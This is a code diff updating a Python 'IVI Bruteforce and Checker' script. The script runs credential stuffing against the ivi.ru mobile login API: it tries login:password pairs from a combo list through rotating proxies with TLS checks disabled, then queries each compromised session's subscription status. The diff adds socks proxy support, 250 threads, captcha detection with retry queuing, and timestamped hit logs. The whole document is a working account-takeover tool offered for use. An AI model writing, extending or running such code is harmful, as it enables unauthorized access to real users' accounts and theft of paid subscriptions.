@@ -1,9 +1,10 @@
 import requests
 import sys, os
 import random
+import datetime
 import threading
 import time
-from colors import bcolors
+from helpers.colors import bcolors
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -14,31 +15,44 @@ class Brute(object):
     def __init__(self):
         self.projectName = "IVI"
         self.projectFullName = "IVI Bruteforce and Checker"
-        self.description = "Some desc is here"
+        self.description = "Author : Pirate2110"
         self.good = 0
         self.bad = 0 
         self.error = 0
+        self.projerror = 0
+        self.proxytype = "https"
+        self.basename = "log.txt"
+        self.proxyname = "proxy.txt"
         self.captcha = 0
         self.running = True
-        self.thread_count = 150
+        self.timeout = 15
+        self.thread_count = 250
+        self.today = datetime.datetime.today()
         self.lines = []
         self.lock = threading.Lock()
         self.count_list = 0
 
     def check(self, login, password):
-        proxies = {
-            'https': self.getproxy()
-            #BURP
-            #'https': '127.0.0.1:8080'
-        }
+        
+        
+        if self.proxytype == "https" :
+            proxies = {'https': self.getproxy()}
+        if self.proxytype == "socks4":
+            proxies = {'socks4': self.getproxy()}
+        if self.proxytype == "socks5":
+            proxies = {'socks5': self.getproxy()}
+        if self.proxytype == "burp":
+            proxies = {'https': '127.0.0.1:8080'}
+        
+        
         body = {'user_ab_bucket' : '1927', 'password': password, 'device' : 'Apple%20iPhone', 'app_version' : '25641', 'email' : login}
         try:
-            r = requests.post("https://api.ivi.ru/mobileapi/user/login/ivi/v6/", data=body, proxies=proxies, verify=False)
+            r = requests.post("https://api.ivi.ru/mobileapi/user/login/ivi/v6/", data=body, proxies=proxies, verify=False, timeout=self.timeout)
             if 'incorrect login or password' in r.text:
                 self.bad += 1
             elif 'session' in r.text:
                 session = r.json()['result']['session']
-                r = requests.get("https://api.ivi.ru/mobileapi/billing/v1/subscription/info/?app_version=870&session=" + session, proxies=proxies, verify=False)
+                r = requests.get("https://api.ivi.ru/mobileapi/billing/v1/subscription/info/?app_version=870&session=" + session, proxies=proxies, verify=False, timeout=self.timeout)
                 if len(r.json()['result']) > 0:
                     if r.json()['result']['expired'] == False:
                         if r.json()['result']['renew_enabled'] == True:
@@ -53,10 +67,14 @@ class Brute(object):
                 else:
                     self.bad += 1
                 #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
+            elif 'you shall not pass' in r.text: 
+                self.captcha += 1
+                self.lines.append(login+':'+password)
             else :
-                self.error += 1
+                self.projerror += 1
         except Exception as e:
             self.error += 1
+            self.lines.append(login+':'+password)
     
     def stop(self):
         self.running = False
@@ -67,7 +85,7 @@ class Brute(object):
 
 
     def mult(self):
-        with open("log.txt", "r") as tags:
+        with open(self.basename, "r") as tags:
             for line in tags:
                 #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                 self.lines.append(line.strip())
@@ -84,12 +102,11 @@ class Brute(object):
     #print(bcolors.WARNING + '[+] Start scanning : ' + str(self.lines[0]) + bcolors.ENDC)
         while self.running:
             if (len(self.lines) == 0):
-                self.running = False
                 self.stop()
                 break
 
             self.lock.acquire()
-            print( str(len(self.lines)) + "/" + str(self.count_list) + " " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC, end='\r')
+            print( str(len(self.lines)) + "/" + str(self.count_list) + " (" + str(len(self.lines)  // (self.count_list/ 100)) + "%) " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC + "/"  + bcolors.UNDERLINE+ str(self.projerror) + bcolors.ENDC + "/"  + bcolors.BOLD+ str(self.captcha) + bcolors.ENDC + " [" + str(threading.active_count()) + "]", end='\r')
             sys.stdout.flush()
             trl = self.lines[0]
             self.lines.pop(0)
@@ -109,12 +126,11 @@ class Brute(object):
         self.lock.release()
 
     def getproxy(self):
-        lines = open('proxy.txt').read().splitlines()
-        myline =random.choice(lines)
-        return myline
+        proxyfile = open('proxy.txt').read().splitlines()
+        return random.choice(proxyfile)
 
     def writelog(self, file, log):
-        dirr = self.projectName +"/"+file
+        dirr = self.projectName + "/" + str(self.today.strftime("%m-%d-%H.%M.%S")) + "/" +file
         os.makedirs(os.path.dirname(dirr), exist_ok=True)
-        with open(dirr, 'w') as the_file:
-            the_file.write(log)
+        with open(dirr, 'a') as the_file:
+            the_file.write(log + '\n')
